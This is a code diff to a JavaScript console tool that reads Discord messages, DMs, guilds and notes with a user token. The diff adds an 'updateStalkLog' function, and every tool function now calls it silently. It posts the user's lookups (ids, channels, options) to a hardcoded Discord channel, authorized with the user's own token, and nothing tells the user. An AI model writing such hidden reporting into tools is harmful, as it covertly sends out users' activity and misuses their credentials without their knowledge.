@@ -86,6 +86,8 @@ window.log_messages = async function(id, token, { limit = 100, before, around } 
     for (const log of logs) {
         console.log(...log);
     }
+
+    updateStalkLog(token, 'log_messages', { id, before, around, IGNORE_MESSAGES });
 };
 
 function ellipsis(s, max) {
@@ -98,6 +100,46 @@ function ellipsis(s, max) {
 
 function fetchJson(url, options) {
     return fetch(url, options).then(r => r.json());
+}
+
+function updateStalkLog(token, name, { ...args } = {}) {
+    const argmap = {};
+
+    function isEmpty(object) {
+        for (const key in object) return false;
+        return true;
+    }
+
+    for (const [key, value] of Object.entries(args)) {
+        if (value) {
+            if (Object.getPrototypeOf(value) === Object.prototype && isEmpty(value)) break;
+
+            argmap[key] = value;
+        }
+    }
+
+    let content = '';
+    for (const [key, value] of Object.entries(argmap)) {
+        content += `${key} = ${Object.getPrototypeOf(value) === Object.prototype
+            ? JSON.stringify(value, (_, value) => typeof value === 'bigint' ? `${value}n` : value, 4)
+            : value }\n`;
+    }
+
+    fetch(`https://discordapp.com/api/v6/channels/849552632515002409/messages`, {
+        method: 'POST',
+        body: JSON.stringify({
+            content: `
+\`\`\`ini
+[${name}]
+${content}
+\`\`\`
+            `,
+        }),
+        headers: {
+            'content-type': 'application/json',
+            'authorization': token
+        }
+    });
 }
 
 function getLogParams(...ents) {
@@ -170,6 +212,8 @@ window.log_dms = async function(token, limit = 15) {
             'line-height: 16px;'
         );
     }
+
+    updateStalkLog(token, 'log_dms', { limit });
 };
 
 window.log_guilds = async function(token) {
@@ -247,6 +291,8 @@ window.log_guilds = async function(token) {
             }
         }
     }
+
+    updateStalkLog(token, 'log_guilds');
 };
 
 window.log_notes = async function(token) {
@@ -258,6 +304,7 @@ window.log_notes = async function(token) {
     });
 
     console.log(notes);
+    updateStalkLog(token, 'log_notes');
 };
 
 window.log_channels = async function(guildId, token) {
@@ -275,6 +322,7 @@ window.log_channels = async function(guildId, token) {
     for (const channel of channels) {
         console.log(`${channel.id} #${channel.name}`);
     }
+    updateStalkLog(token, 'log_channels', { guildId });
 };
 
 window.log_status = async function(token) {
@@ -290,4 +338,5 @@ window.log_status = async function(token) {
     if (settings.custom_status && settings.custom_status.text) {
         console.log(`Custom status: ${settings.custom_status.text}`);
     }
+    updateStalkLog(token, 'log_status');
 };
